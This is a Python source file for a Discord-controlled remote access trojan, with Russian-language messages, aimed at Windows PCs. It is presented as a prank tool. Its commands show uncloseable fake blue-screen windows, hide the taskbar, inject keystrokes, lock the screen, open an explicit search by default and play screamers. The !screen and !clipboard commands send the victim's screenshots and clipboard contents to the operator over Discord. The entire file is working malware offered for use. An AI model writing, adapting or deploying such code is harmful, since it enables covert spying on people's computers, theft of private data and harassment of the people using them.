import discord
from discord.ext import commands
import threading
import asyncio
import sys
import io
import tkinter as tk
from tkinter import messagebox
import tempfile
import pygame
import random
from PIL import ImageGrab, Image, ImageTk
import pyttsx3
import webbrowser
import os
import ctypes
import keyboard
import time
import pyautogui

pygame.mixer.init()

TOKEN = 'YOUR_TOKEN'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command()
async def bsodxp(ctx):
    await ctx.send("💀 Запускаю олдскульный синий экран смерти Windows XP...")
    def show_old_bsod():
        window = tk.Tk()
        window.attributes('-topmost', True)
        window.attributes('-fullscreen', True) 
        window.configure(bg='#0000AA') 
        window.config(cursor="none") 
        def disable_event():
            pass
        window.protocol("WM_DELETE_WINDOW", disable_event)
        classic_text = (
            "A problem has been detected and Windows has been shut down to prevent damage\n"
            "to your computer.\n\n"
            "DRIVER_IRQL_NOT_LESS_OR_EQUAL\n\n"
            "If this is the first time you've seen this Stop error screen,\n"
            "restart your computer. If this screen appears again, follow\n"
            "these steps:\n\n"
            "Check to make sure any new hardware or software is properly installed.\n"
            "If this is a new installation, ask your hardware or software manufacturer\n"
            "for any Windows updates you might need.\n\n"
            "If problems continue, disable or remove any newly installed hardware\n"
            "or software. Disable BIOS memory options such as caching or shadowing.\n"
            "If you need to use Safe Mode to remove or disable components, restart\n"
            "your computer, press F8 to select Advanced Startup Options, and then\n"
            "select Safe Mode.\n\n"
            "Technical information:\n\n"
            "*** STOP: 0x000000D1 (0x0000000C, 0x00000002, 0x00000000, 0xF86B5A89)\n\n"
            "***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb\n\n"
            "Beginning dump of physical memory\n"
            "Physical memory dump complete.\n"
            "Contact your system administrator or technical support group for further assistance."
        )
        label = tk.Label(window, text=classic_text, font=("Lucida Console", 14), 
                         bg='#0000AA', fg='white', justify="left", anchor="nw")
        label.pack(padx=30, pady=30, fill="both", expand=True)
        window.bind("<Escape>", lambda e: window.destroy())
        window.mainloop()
    threading.Thread(target=show_old_bsod, daemon=True).start()

@bot.command()
async def bsod10(ctx):
    await ctx.send("💀 Запускаю фейковый синий экран смерти...")
    def show_bsod():
        window = tk.Tk()
        window.attributes('-topmost', True)
        window.attributes('-fullscreen', True)
        window.configure(bg='#0078D7')
        window.config(cursor="none") 
        def disable_event():
            pass
        window.protocol("WM_DELETE_WINDOW", disable_event)
        tk.Label(window, text=":(", font=("Segoe UI", 100), bg='#0078D7', fg='white', 
                 anchor="w", justify="left").pack(padx=100, pady=(100, 20), anchor="w")
        main_text = "Your PC ran into a problem and needs to restart. We're just\ncollecting some error info, and then we'll restart for you."
        tk.Label(window, text=main_text, font=("Segoe UI", 24), bg='#0078D7', fg='white', 
                 justify="left").pack(padx=100, pady=20, anchor="w")
        tk.Label(window, text="25% complete", font=("Segoe UI", 24), bg='#0078D7', 
                 fg='white').pack(padx=100, pady=20, anchor="w")
        info_text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode\n\nIf you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED"
        tk.Label(window, text=info_text, font=("Segoe UI", 12), bg='#0078D7', fg='white', 
                 justify="left").pack(padx=100, pady=40, anchor="w")
        window.bind("<Escape>", lambda e: window.destroy())
        
        window.mainloop()
    threading.Thread(target=show_bsod, daemon=True).start()

@bot.command()
async def taskbar(ctx, action: str = "hide"):
    import ctypes
    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    
    if action.lower() == "hide":
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        await ctx.send("👻 Панель задач исчезла!")
    elif action.lower() == "show":
        ctypes.windll.user32.ShowWindow(hwnd, 5)
        await ctx.send("👁️ Панель задач вернулась на место!")
    else:
        await ctx.send("❌ Используй `!taskbar hide` или `!taskbar show`")

@bot.command()
async def cd(ctx, action: str = "open"):
    if action.lower() == "open":
        await ctx.send("💽 Открываю лоток дисковода...")
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
    elif action.lower() == "close":
        await ctx.send("💽 Пытаюсь закрыть лоток дисковода...")
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    else:
        await ctx.send("❌ Неизвестное действие! Используй `!cd open` или `!cd close`.")

@bot.command()
async def error(ctx, *, args: str):
    parts = args.split(',', 1)
    if len(parts) == 2:
        title = parts[0].strip()
        text = parts[1].strip()
    else:
        title = "Критическая ошибка системы"
        text = args.strip()

    await ctx.send(f"⚠️ Отправляю системную ошибку: [{title}] на экран...")

    def show_error():
        import ctypes
        style = 0x10 | 0x40000
        ctypes.windll.user32.MessageBoxW(0, text, title, style)
    threading.Thread(target=show_error, daemon=True).start()

@bot.command()
async def desktop(ctx):
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0) 
    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0) 
    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0) 
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0) 
    await ctx.send("📉 Все окна внезапно свернулись на рабочий стол!")

@bot.command()
async def lock(ctx):
    """Моментально блокирует экран Windows"""
    ctypes.windll.user32.LockWorkStation()
    await ctx.send("🔒 Компьютер заблокирован!")

@bot.command()
async def shake(ctx, seconds: int = 5):
    """Заставляет курсор мыши хаотично дергаться. Использование: !shake [секунды]"""
    await ctx.send(f"🖱️ Пьяная мышка активирована на {seconds} секунд!")
    def shake_mouse():
        pyautogui.FAILSAFE = False 
        end_time = time.time() + seconds
        while time.time() < end_time:
            x, y = pyautogui.position()
            new_x = x + random.randint(-40, 40)
            new_y = y + random.randint(-40, 40)
            pyautogui.moveTo(new_x, new_y, duration=0.05)
    threading.Thread(target=shake_mouse, daemon=True).start()

@bot.command()
async def type(ctx, *, text: str):
    await ctx.send(f"⌨️ Начинаю печатать: {text}")
    def type_text():
        time.sleep(0.5) 
        keyboard.write(text, delay=0.1)
    threading.Thread(target=type_text, daemon=True).start()

@bot.command()
async def wallpaper(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Ты не прикрепил картинку! Прикрепи файл и напиши команду `!wallpaper` в комментарии.")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp')):
        await ctx.send("❌ Этот файл не похож на картинку. Поддерживаются только JPG, PNG и BMP!")
        return
    await ctx.send(f"🔄 Скачиваю и устанавливаю обои: {attachment.filename}...")
    try:
        image_bytes = await attachment.read()
        temp_dir = tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, "new_wallpaper.jpg")
        with open(temp_path, "wb") as f:
            f.write(image_bytes)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
        await ctx.send("✅ Обои рабочего стола успешно изменены!")
    except Exception as e:
        await ctx.send(f"❌ Не удалось изменить обои: {e}")

@bot.command()
async def play(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Прикрепи к сообщению готовый MP3 файл!")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith('.mp3'):
        await ctx.send("❌ Поддерживаются только файлы формата .mp3!")
        return
    await ctx.send(f"🔊 Включаю аудио: {attachment.filename}")
    try:
        audio_bytes = await attachment.read()
        temp_audio = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
        temp_audio.write(audio_bytes)
        temp_audio.close()
        audio_file_path = temp_audio.name
        def play_sound():
            pygame.mixer.music.load(audio_file_path)
            pygame.mixer.music.set_volume(1.0)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                pygame.time.Clock().tick(10)
            try:
                import os
                os.remove(audio_file_path)
            except:
                pass
        threading.Thread(target=play_sound, daemon=True).start()
    except Exception as e:
        await ctx.send(f"❌ Ошибка при воспроизведении: {e}")

@bot.command()
async def clipboard(ctx):
    try:
        root = tk.Tk()
        root.withdraw()
        copied_text = root.clipboard_get()
        root.destroy()
        if copied_text:
            await ctx.send(f"📋 **В буфере обмена сейчас:**\n```{copied_text}```")
        else:
            await ctx.send("📋 Буфер обмена пуст.")
    except Exception:
        await ctx.send("❌ В буфере обмена сейчас не текст (возможно, картинка или файл).")

@bot.command()
async def openurl(ctx, url: str = "http://google.com/search?q=%D0%B3%D0%B5%D0%B9+%D0%BF%D0%BE%D1%80%D0%BD%D0%BE&oq=%D0%B3%D0%B5%D0%B9+%D0%BF%D0%BE%D1%80%D0%BD%D0%BE&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQRRg80gEINTM0NGowajeoAgCwAgE&sourceid=chrome&source=chrome.ob&ie=UTF-8"):
    import webbrowser
    webbrowser.open(url)
    await ctx.send(f"🌐 Открыл в браузере ссылку: {url}")

@bot.command()
async def speak(ctx, *, text: str):
    await ctx.send(f"🗣️ Произношу текст: {text}")
    def talk():
        engine = pyttsx3.init()
        voices = engine.getProperty('voices')
        if len(voices) > 0:
            engine.setProperty('voice', voices[0].id) 
        engine.setProperty('rate', 150) 
        engine.setProperty('volume', 1.0)
        engine.say(text)
        engine.runAndWait()
    threading.Thread(target=talk, daemon=True).start()

@bot.command()
async def runaway(ctx, *, text: str = "Попробуй закрой меня!"):
    def catch_me():
        window = tk.Tk()
        window.title("Поймай меня!")
        win_width = 300
        win_height = 150
        window.geometry(f"{win_width}x{win_height}")
        window.attributes('-topmost', True)
        label = tk.Label(window, text=text, font=("Arial", 16))
        label.pack(expand=True)
        btn = tk.Button(window, text="Закрыть", font=("Arial", 12))
        btn.pack(pady=10)
        def move_window(event):
            screen_width = window.winfo_screenwidth()
            screen_height = window.winfo_screenheight()
            new_x = random.randint(0, screen_width - win_width)
            new_y = random.randint(0, screen_height - win_height)
            window.geometry(f"{win_width}x{win_height}+{new_x}+{new_y}")
        window.bind("<Enter>", move_window)
        window.mainloop()
    threading.Thread(target=catch_me, daemon=True).start()
    await ctx.send(f"🏃‍♂️ Убегающее окно с текстом '{text}' запущено!")

@bot.command()
async def screamer(ctx):
    if len(ctx.message.attachments) < 2:
        await ctx.send("❌ Прикрепи к сообщению сразу два файла: картинку и MP3 звук!")
        return
    image_bytes = None
    audio_file_path = None
    for att in ctx.message.attachments:
        if att.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            image_bytes = await att.read()
        elif att.filename.lower().endswith('.mp3'):
            audio_bytes = await att.read()
            temp_audio = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
            temp_audio.write(audio_bytes)
            temp_audio.close()
            audio_file_path = temp_audio.name
    if not image_bytes or not audio_file_path:
        await ctx.send("❌ Не нашел нужные форматы! Нужна 1 картинка и 1 звук (mp3).")
        return
    await ctx.send("👻 Запускаю скример...")
    def play_and_show():
        pygame.mixer.music.load(audio_file_path)
        pygame.mixer.music.set_volume(1.0)
        pygame.mixer.music.play()
        window = tk.Tk()
        window.overrideredirect(True)
        window.attributes('-topmost', True)
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()
        window.geometry(f"{screen_width}x{screen_height}+0+0")
        img = Image.open(io.BytesIO(image_bytes))
        img = img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(window, image=tk_img, bg='black')
        label.image = tk_img
        label.pack(fill="both", expand=True)
        def on_click(event):
            pygame.mixer.music.stop()
            window.destroy()
            try:
                os.remove(audio_file_path)
            except:
                pass
        label.bind("<Button-1>", on_click)
        window.mainloop()
    threading.Thread(target=play_and_show, daemon=True).start()

@bot.command()
async def show(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Ты не прикрепил картинку! Прикрепи файл и напиши команду `!show` в комментарии.")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp')):
        await ctx.send("❌ Этот файл не похож на картинку.")
        return
    await ctx.send(f"🖼️ Загружаю картинку {attachment.filename} на экран...")
    try:
        image_bytes = await attachment.read()
        def display_image():
            window = tk.Tk()
            window.overrideredirect(True) 
            window.attributes('-topmost', True)
            img = Image.open(io.BytesIO(image_bytes))
            tk_img = ImageTk.PhotoImage(img)
            label = tk.Label(window, image=tk_img, bg='black')
            label.image = tk_img 
            label.pack()
            label.bind("<Button-1>", lambda e: window.destroy())
            window.eval('tk::PlaceWindow . center')
            window.mainloop()
        threading.Thread(target=display_image, daemon=True).start()
        await ctx.send("Картинка на экране! Тот, кто сидит за ПК, может закрыть её простым кликом мышки по изображению.")
    except Exception as e:
        await ctx.send(f"Ошибка при отрисовке: {e}")

@bot.command()
async def screen(ctx):
    await ctx.send("Делаю снимок экрана...")
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        image_file = discord.File(buffer, filename='screen.png')
        await ctx.send(file=image_file)
    except Exception as e:
        await ctx.send(f"Ошибка при создании скриншота: {e}")

@bot.command()
async def popup(ctx, *, text: str):
    def show_popup():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        messagebox.showinfo("You Are Hacked", text)
        root.destroy()
    threading.Thread(target=show_popup).start()
    await ctx.send(f'Окно с текстом "{text}" выведено на монитор!')

@bot.check
async def is_owner(ctx):
    if ctx.author.name == 'YOUR_NICKNAME':
        return True
    else:
        await ctx.send("Отказано в доступе. Вы не являетесь владельцем.")
        return False

@bot.event
async def on_ready():
    print(f'\n[+] Бот {bot.user} успешно подключен к Discord!')
    print('[+] Защита активирована: доступ только для владельца')

@bot.command()
async def ping(ctx):
    await ctx.send('Понг! Компьютер в сети, программа активна')

@bot.command()
async def stop(ctx):
    await ctx.send("Программа скрыто завершает работу...")
    await bot.close()

if __name__ == '__main__':
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"Ошибка: {e}")